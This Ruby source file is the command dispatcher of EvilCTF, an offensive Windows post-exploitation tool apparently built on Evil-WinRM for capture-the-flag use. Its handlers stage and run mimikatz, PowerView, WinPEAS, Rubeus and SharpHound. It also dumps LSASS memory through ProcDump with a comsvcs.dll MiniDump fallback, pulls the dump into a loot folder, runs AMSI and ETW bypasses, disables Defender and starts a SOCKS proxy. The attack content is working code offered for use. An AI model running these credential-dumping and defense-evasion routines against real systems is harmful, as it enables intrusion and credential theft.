# frozen_string_literal: true

require 'monitor'
require 'ostruct'
require_relative 'tools'
require_relative 'execution'
require_relative 'uploader'
require_relative 'enums'
require_relative 'sql_enum'
require_relative 'async_worker'
require_relative 'tool_registry'
require_relative 'engine_audit'

module EvilCTF
  # Dispatcher for handling commands in the EvilCTF session.
  # Replaces the large case statement in session.rb with a handler-based approach.
  class CommandDispatcher
    def self.instance
      @instance ||= new
    end

    def self.dispatch(name:, args: nil, shell:, session_options:, command_manager: nil, history: nil)
      instance.dispatch(
        name: name,
        args: args,
        shell: shell,
        session_options: session_options,
        command_manager: command_manager,
        history: history
      )
    end

    attr_reader :handlers

    def initialize
      @mutex = Monitor.new
      @handlers = {}
      @pass_through = true # Default: pass unknown commands through
      @async_worker = EvilCTF::AsyncWorker.new

      # Pre-register all handlers
      register_core_commands
    end

    def register(name, &block)
      @mutex.synchronize do
        @handlers[name] = block
      end
    end

    def unregister(name)
      @mutex.synchronize do
        @handlers.delete(name)
      end
    end

    # Dispatch a command and return a result hash.
    # Returns:
    #   { ok: true, output: "<output>", handled: true } on success
    #   { ok: false, output: "", error: "<error_message>", handled: true } on handler failure
    #   { ok: false, output: "", handled: false } not a known command, pass through
    def dispatch(name:, args: nil, shell:, session_options:, command_manager: nil, history: nil)
      # Make command_manager and history available in session_options for handlers
      session_options[:command_manager] = command_manager if command_manager
      session_options[:history] = history if history

      normalized = name.to_s.strip.downcase
      normalized = 'help' if normalized == 'menu'
      tokens = normalized.split(/\s+/)

      # Special handling for 'history' command with optional argument
      if normalized == 'history' && args && args.strip != ''
        normalized = 'history ' + args.strip.downcase
      end

      # Resolve command key in a tolerant order so full user input still maps
      # to one-word or two-word registered handlers.
      candidate_keys = []
      candidate_keys << normalized unless normalized.empty?
      candidate_keys << tokens[0, 2].join(' ') if tokens.length >= 2
      candidate_keys << tokens.first if tokens.first
      candidate_keys.uniq!

      command_key = candidate_keys.find { |key| @handlers.key?(key) }
      handler = command_key ? @handlers[command_key] : nil
      return { ok: false, output: '', handled: false } unless handler

      begin
        handler_result = handler.call(shell, args, session_options)

        # Handlers may return either a plain output object or a structured
        # dispatcher result hash ({ ok:, output:, error:, handled: }).
        if handler_result.is_a?(Hash) && (handler_result.key?(:ok) || handler_result.key?('ok'))
          ok_value = handler_result.key?(:ok) ? handler_result[:ok] : handler_result['ok']
          output_value = if handler_result.key?(:output)
                           handler_result[:output]
                         else
                           handler_result['output']
                         end
          error_value = if handler_result.key?(:error)
                          handler_result[:error]
                        else
                          handler_result['error']
                        end
          handled_value = if handler_result.key?(:handled)
                            handler_result[:handled]
                          elsif handler_result.key?('handled')
                            handler_result['handled']
                          else
                            true
                          end

          return {
            ok: !!ok_value,
            output: output_value.to_s,
            error: error_value,
            handled: handled_value.nil? ? true : !!handled_value
          }
        end

        { ok: true, output: handler_result.to_s, handled: true }
      rescue => e
        EvilCTF::EngineAudit.error(message: "dispatcher handler failed: #{command_key}", error: e, source: 'command_dispatcher')
        { ok: false, output: '', error: e.message, handled: true }
      end
    end

    private

    def register_core_commands
      register('help') do |shell, args, session_options|
        require 'colorize'
        output = "\n" + "Builtin commands:".colorize(:cyan)

        help_cmds = [
          ['help', 'This help'],
          ['clear', 'Clear screen'],
          ['tools', 'List tool registry'],
          ['download_missing', 'Download all missing tools into ./tools'],
          ['dump_creds', 'Stage mimikatz & dump logon passwords'],
          ['lsass_dump', 'Stage procdump & dump LSASS to ./loot'],
          ['enum [type]', 'Run enumeration preset (basic, deep, sql, etc.)'],
          ['fileops', 'File operations menu (upload/download/ZIP)'],
          ['bypass-4msi', 'Try AMSI bypass'],
          ['bypass-etw', 'Full ETW bypass'],
          ['disable_defender', 'Try disabling Defender real-time'],
          ['history', 'Show command history'],
          ['history clear', 'Clear history file'],
          ['profile save <name>', 'Save current options as profile'],
          ['get-unquotedservices', 'Show all unquoted service paths'],
          ['load_ps1 <local_ps1>', 'Upload and load PS1 script'],
          ['invoke-binary <local_bin> [args]', 'Upload and execute binary'],
          ['services', 'List services'],
          ['processes', 'List processes'],
          ['sysinfo', 'System info'],
          ['__exit__/exit/quit', 'Exit this Evil-WinRM CTF session'],
          ['!sh / !bash', 'Spawn local shell']
        ]

        help_cmds.each do |cmd, desc|
          output += "\n" + "  ".colorize(:light_black) + cmd.colorize(:green) + " - ".colorize(:light_black) + desc.colorize(:white)
        end

        output += "\n" + "Macros: ".colorize(:cyan)
        # command_manager is available via session_options[:command_manager]
        cm = session_options[:command_manager]
        if cm
          output += cm.list_macros.join(', ').colorize(:magenta)
        else
          output += 'N/A'
        end

        output += "\nAliases: ".colorize(:cyan)
        if cm
          output += cm.list_aliases.join(', ').colorize(:magenta)
        else
          output += 'N/A'
        end
        output
      end

      # menu is a friendly alias used by operators
      register('menu') do |shell, args, session_options|
        @handlers['help'].call(shell, args, session_options)
      end

      # clear
      register('clear') do |shell, args, session_options|
        system('clear || cls')
        ''
      end

      # tools
      register('tools') do |shell, args, session_options|
        root = File.expand_path('../..', __dir__)
        registry = EvilCTF::ToolRegistry.new(root_path: root)
        tools = registry.scan
        if tools.empty?
          puts '[!] No tools discovered in tools/'
        else
          puts "[*] Dynamic Tool Registry (#{tools.size} entries)"
          tools.each do |tool|
            required = Array(tool.metadata['required_args']).join(', ')
            puts "- #{tool.name} (required_args: #{required.empty? ? 'none' : required})"
          end
        end
        EvilCTF::Tools.list_available_tools
        ''
      end

      register('tool') do |shell, args, session_options|
        root = File.expand_path('../..', __dir__)
        registry = EvilCTF::ToolRegistry.new(root_path: root)
        raw = args.to_s.strip
        return "Usage: tool <name> key=value ..." if raw.empty?

        tokens = raw.split(/\s+/)
        name = tokens.shift
        parsed_args = {}
        tokens.each do |token|
          key, value = token.split('=', 2)
          parsed_args[key.to_s] = value.to_s
        end

        payload = registry.build_invocation(tool_name: name, arguments: parsed_args)
        return payload[:error] if payload.nil? || payload[:error]

        @async_worker.enqueue(priority: 50, name: "tool:#{name}", shell: shell, command: payload[:command])
        "Queued tool '#{name}'"
      rescue StandardError => e
        EvilCTF::EngineAudit.error(message: 'tool command failed', error: e, source: 'command_dispatcher')
        "tool command failed: #{e.message}"
      end

      # download_missing
      register('download_missing') do |shell, args, session_options|
        EvilCTF::Tools.download_missing_tools
        ''
      end

      register('recon_basic') do |shell, args, session_options|
        logger = session_options[:logger] || OpenStruct.new
        @async_worker.enqueue_block(priority: 20, name: 'recon_basic', logger: logger) do
          begin
            outputs = []
            ['whoami /all', 'net user', 'systeminfo'].each do |cmd|
              res = EvilCTF::Execution.run(shell, cmd, timeout: 60)
              outputs << "> #{cmd}\n#{res.output}"
            end
            logger&.info('[recon_basic] completed')
            outputs.join("\n")
          rescue StandardError => e
            EvilCTF::EngineAudit.error(message: 'recon_basic background job failed', error: e, source: 'command_dispatcher')
            raise
          end
        end
        'Queued recon_basic in background job queue'
      end

      # dump_creds
      register('dump_creds') do |shell, args, session_options|
        logger = session_options[:logger] || OpenStruct.new
        command_manager = session_options[:command_manager]

        @async_worker.enqueue_block(priority: 10, name: 'dump_creds', logger: logger) do
          begin
            EvilCTF::Tools.safe_autostage('mimikatz', shell, session_options, logger)
            EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
            command_manager.expand_macro('dump_creds', shell, webhook: session_options[:webhook])
          rescue StandardError => e
            EvilCTF::EngineAudit.error(message: 'dump_creds background job failed', error: e, source: 'command_dispatcher')
            raise
          end
        end
        'Queued dump_creds in background job queue'
      end

      # lsass_dump
      register('lsass_dump') do |shell, args, session_options|
        logger = session_options[:logger] || OpenStruct.new

        EvilCTF::Tools.safe_autostage('procdump', shell, session_options, logger)
        command_manager = session_options[:command_manager]
        command_manager.expand_macro('lsass_dump', shell, webhook: session_options[:webhook])

        locate_ps = <<~PS
          try {
            $files = Get-ChildItem -LiteralPath 'C:\\Users\\Public' -File -ErrorAction SilentlyContinue |
              Where-Object { $_.Name -like 'lsass*.dmp*' } |
              Sort-Object LastWriteTime -Descending
            if ($files -and $files.Count -gt 0) {
              "FOUND::" + $files[0].FullName
            } else {
              "MISSING"
            }
          } catch {
            "ERROR::" + $_.Exception.Message
          }
        PS

        resolve_dump_path = lambda do
          locate_res = shell.run(locate_ps)
          locate_out = locate_res&.output.to_s
          found_line = locate_out.lines.map(&:strip).find { |ln| ln.start_with?('FOUND::') }
          dump_path = found_line ? found_line.sub('FOUND::', '').strip : nil
          [dump_path, locate_out]
        end

        dump_path, locate_out = resolve_dump_path.call

        unless dump_path
          puts '[*] No dump from initial macro run; retrying ProcDump with explicit diagnostics...'
          procdump_retry_ps = <<~PS
            try {
              $exe = 'C:\\Users\\Public\\procdump64.exe'
              if (!(Test-Path -LiteralPath $exe)) {
                "RETRY_ERROR::ProcDump not found at $exe"
              } else {
                $target = 'C:\\Users\\Public\\lsass_retry.dmp'
                & $exe -accepteula -ma lsass.exe $target 2>&1 | ForEach-Object { $_.ToString() }
                "RETRY_EXIT::$LASTEXITCODE"
              }
            } catch {
              "RETRY_ERROR::" + $_.Exception.Message
            }
          PS
          retry_res = shell.run(procdump_retry_ps)
          retry_out = retry_res&.output.to_s
          retry_out.lines.each { |ln| puts "[procdump] #{ln.strip}" unless ln.to_s.strip.empty? }
          if retry_out.include?('RETRY_EXIT::-1073741515')
            puts '[!] ProcDump failed with STATUS_DLL_NOT_FOUND (-1073741515). Target likely lacks required runtime/DLL dependencies for this binary.'
          end

          dump_path, locate_out = resolve_dump_path.call
        end

        unless dump_path
          puts '[*] ProcDump still did not produce a file; attempting comsvcs MiniDump fallback...'
          comsvcs_ps = <<~PS
            try {
              $lsass = Get-Process -Name lsass -ErrorAction Stop | Select-Object -First 1
              $lsassPid = $lsass.Id
              $out = 'C:\\Users\\Public\\lsass_comsvcs.dmp'
              $args = "C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsassPid $out full"
              $p = Start-Process -FilePath 'rundll32.exe' -ArgumentList $args -PassThru -Wait -WindowStyle Hidden
              "COMSVCS_EXIT::$($p.ExitCode)"
            } catch {
              "COMSVCS_ERROR::" + $_.Exception.Message
            }
          PS
          comsvcs_res = shell.run(comsvcs_ps)
          comsvcs_out = comsvcs_res&.output.to_s
          comsvcs_out.lines.each { |ln| puts "[comsvcs] #{ln.strip}" unless ln.to_s.strip.empty? }

          dump_path, locate_out = resolve_dump_path.call
        end

        if dump_path
          EvilCTF::Uploader.download_file(
            remote_path: dump_path,
            local_path: "loot/lsass_#{session_options[:ip]}.dmp",
            shell: shell
          )
        else
          puts '[!] No LSASS dump file found in C:\\Users\\Public after procdump execution.'
          if locate_out.include?('ERROR::')
            puts "[!] Dump discovery error: #{locate_out.lines.map(&:strip).find { |ln| ln.start_with?('ERROR::') }}"
          end
          puts '[!] Current user likely lacks required LSASS access (admin + SeDebug and no PPL/Credential Guard constraints).'
        end
        ''
      end

      # fileops
      register('fileops') do |shell, args, session_options|
        EvilCTF::Uploader.file_operations_menu(shell)
        ''
      end

      # enum - handles optional type argument
      register('enum') do |shell, args, session_options|
        t = (args && args.strip) ? args.strip.downcase : 'basic'

        if t == 'deep'
          logger = session_options[:logger] || OpenStruct.new
          EvilCTF::Tools.safe_autostage('winpeas', shell, session_options, logger)
        end

        if t == 'dom'
          logger = session_options[:logger] || OpenStruct.new
          EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
          EvilCTF::Execution.run(shell, "IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)", timeout: 120)
        end

        if t == 'sql'
          EvilCTF::SQLEnum.run_sql_enum(shell)
        else
          enum_cache = session_options[:enum_cache] ||= {}
          EvilCTF::Enums.run_enumeration(shell, type: t, cache: enum_cache, fresh: session_options[:fresh])
        end
        ''
      end

      # dom_enum
      register('dom_enum') do |shell, args, session_options|
        logger = session_options[:logger] || OpenStruct.new
        enum_cache = session_options[:enum_cache] ||= {}
        EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
        EvilCTF::Execution.run(shell, "IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)", timeout: 120)
        EvilCTF::Enums.run_enumeration(shell, type: 'dom', cache: enum_cache, fresh: session_options[:fresh])
        ''
      end

      # disable_defender
      register('disable_defender') do |shell, args, session_options|
        EvilCTF::Tools.disable_defender(shell)
        ''
      end

      # history (show)
      register('history') do |shell, args, session_options|
        history = session_options[:history]
        history.show if history
        ''
      end

      # history clear
      register('history clear') do |shell, args, session_options|
        history = session_options[:history]
        history.clear if history
        puts '[+] History cleared'
        ''
      end

      # profile save
      register('profile save') do |shell, args, session_options|
        name = args.strip if args
        if name && !name.empty?
          EvilCTF::Tools.save_config_profile(name, session_options)
        else
          puts '[*] Usage: profile save <name>'
        end
        ''
      end

      # get-unquotedservices
      register('get-unquotedservices') do |shell, args, session_options|
        puts "[*] Getting all unquoted service paths..."
        unquoted_ps = <<~POWERSHELL
          Get-CimInstance -Class Win32_Service | Where-Object {
            $_.PathName -notlike '`"*' -and $_.PathName -like '*.exe*' -and $_.PathName -like '* *'
          } | Select-Object Name, DisplayName, PathName, State, StartMode | Format-Table -AutoSize
        POWERSHELL
        exec_res = EvilCTF::Execution.run(shell, unquoted_ps, timeout: 30)
        puts exec_res.output
        ''
      end

      # bypass-4msi - AMSI bypass with detection and verification
      register('bypass-4msi') do |shell, args, session_options|
        output = []
        # Run detection
        detect_result = EvilCTF::Execution.run(shell, EvilCTF::Tools::BYPASS_DETECTION_PS, timeout: 30)
        output << detect_result.output

        # Run enhanced or standard bypass based on detection
        if detect_result.output.include?("Windows 11")
          output << "[*] Running enhanced Windows 11/2022+ AMSI bypass..."
        else
          output << "[*] Running standard AMSI bypass..."
        end

        bypass_result = EvilCTF::Execution.run(shell, EvilCTF::Tools::BYPASS_4MSI_PS, timeout: 60)
        output << bypass_result.output

        # Run verification
        verify_result = EvilCTF::Execution.run(shell, EvilCTF::Tools::BYPASS_VERIFICATION_PS, timeout: 30)
        output << verify_result.output

        output.join("\n")
      end

      # bypass-etw - Full ETW bypass with detection and verification
      register('bypass-etw') do |shell, args, session_options|
        output = []
        # Run detection
        detect_result = EvilCTF::Execution.run(shell, EvilCTF::Tools::BYPASS_DETECTION_PS, timeout: 30)
        output << detect_result.output

        # Run ETW bypass
        etw_result = EvilCTF::Execution.run(shell, EvilCTF::Tools::ETW_BYPASS_PS, timeout: 60)
        output << etw_result.output

        # Run verification
        verify_result = EvilCTF::Execution.run(shell, EvilCTF::Tools::BYPASS_VERIFICATION_PS, timeout: 30)
        output << verify_result.output

        output.join("\n")
      end

      # tool - handles staging and optional execution of tools
      register('tool') do |shell, args, session_options|
        return { ok: false, error: 'Usage: tool <tool_name> (or "all")' } unless args && args.strip

        key = args.strip
        logger = session_options[:logger] || OpenStruct.new

        if key == 'all'
          puts "[*] Staging all tools..."
          EvilCTF::Tools::TOOL_REGISTRY.each_key do |tool_key|
            EvilCTF::Tools.safe_autostage(tool_key, shell, session_options, logger)
          end
        else
          puts "[*] Staging tool: #{key}"
          success = EvilCTF::Tools.safe_autostage(key, shell, session_options, logger)
          if success
            puts "[+] Tool '#{key}' staged successfully"
            tool = EvilCTF::Tools::TOOL_REGISTRY[key]
            if tool && tool[:recommended_remote]
              remote_path = tool[:recommended_remote]
              case key.downcase
              when 'mimikatz'
                puts "[*] Executing mimikatz..."
                ps_cmd = <<~PS
                  try {
                    \$proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
                    \$proc.WaitForExit(30000) | Out-Null
                    if (\$proc.HasExited) {
                      Write-Output "Mimikatz completed with exit code: \$(\$proc.ExitCode)"
                    } else {
                      Write-Output "Mimikatz timed out after 30 seconds"
                      \$proc.Kill()
                    }
                  } catch {
                    Write-Output "Error executing mimikatz: \$_.Exception.Message"
                  }
                PS
                exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
                puts exec_res.output

              when 'winpeas'
                puts "[*] Executing winpeas..."
                ps_cmd = <<~PS
                  try {
                    \$proc = Start-Process -FilePath "cmd" -ArgumentList "/c '#{EvilCTF::Utils.escape_ps_string(remote_path)}'" -PassThru -WindowStyle Hidden
                    \$proc.WaitForExit(60000) | Out-Null
                    if (\$proc.HasExited) {
                      Write-Output "WinPEAS completed with exit code: \$(\$proc.ExitCode)"
                    } else {
                      Write-Output "WinPEAS timed out after 60 seconds"
                      \$proc.Kill()
                    }
                  } catch {
                    Write-Output "Error executing winpeas: \$_.Exception.Message"
                  }
                PS
                exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 70)
                puts exec_res.output

              when 'procdump'
                puts "[*] Executing procdump..."
                ps_cmd = <<~PS
                  try {
                    \$proc = Start-Process -FilePath "cmd" -ArgumentList "/c '#{EvilCTF::Utils.escape_ps_string(remote_path)}'" -PassThru -WindowStyle Hidden
                    \$proc.WaitForExit(30000) | Out-Null
                    if (\$proc.HasExited) {
                      Write-Output "Procdump completed with exit code: \$(\$proc.ExitCode)"
                    } else {
                      Write-Output "Procdump timed out after 30 seconds"
                      \$proc.Kill()
                    }
                  } catch {
                    Write-Output "Error executing procdump: \$_.Exception.Message"
                  }
                PS
                exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
                puts exec_res.output

              when 'rubeus', 'seatbelt'
                puts "[*] Executing #{key}..."
                ps_cmd = <<~PS
                  try {
                    \$proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
                    \$proc.WaitForExit(30000) | Out-Null
                    if (\$proc.HasExited) {
                      Write-Output "#{key.capitalize} completed with exit code: \$(\$proc.ExitCode)"
                    } else {
                      Write-Output "#{key.capitalize} timed out after 30 seconds"
                      \$proc.Kill()
                    }
                  } catch {
                    Write-Output "Error executing #{key}: \$_.Exception.Message"
                  }
                PS
                exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
                puts exec_res.output

              when 'inveigh', 'powerview', 'sharphound'
                puts "[*] Executing #{key} PowerShell script..."
                ps_script = "IEX (Get-Content '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -Raw) 2>&1"
                exec_res = EvilCTF::Execution.run(shell, ps_script, timeout: 120)
                puts exec_res.output

              when 'socksproxy'
                puts "[*] Executing SOCKS proxy PowerShell module..."
                ps_script = "Import-Module '#{EvilCTF::Utils.escape_ps_string(remote_path)}' 2>&1; Invoke-SocksProxy -Port 1080"
                exec_res = EvilCTF::Execution.run(shell, ps_script, timeout: 120)
                puts exec_res.output

              else
                if remote_path.end_with?('.exe')
                  puts "[*] Executing #{key}..."
                  ps_cmd = <<~PS
                    try {
                      \$proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
                      \$proc.WaitForExit(30000) | Out-Null
                      if (\$proc.HasExited) {
                        Write-Output "#{key.capitalize} completed with exit code: \$(\$proc.ExitCode)"
                      } else {
                        Write-Output "#{key.capitalize} timed out after 30 seconds"
                        \$proc.Kill()
                      }
                    } catch {
                      Write-Output "Error executing #{key}: \$_.Exception.Message"
                    }
                  PS
                  exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
                  puts exec_res.output
                else
                  puts "[*] Tool staged. Execute manually with: #{remote_path}"
                end
              end
            end
          else
            puts "[-] Failed to stage tool '#{key}'"
          end
        end
        ''
      end

      # !bash / !sh - spawn local shell
      register('!bash') do |shell, args, session_options|
        puts '[*] Spawning local shell. Type "exit" to return.'
        system(ENV['SHELL'] || '/bin/bash')
        ''
      end

      register('!sh') do |shell, args, session_options|
        puts '[*] Spawning local shell. Type "exit" to return.'
        system(ENV['SHELL'] || '/bin/bash')
        ''
      end
    end
  end
end
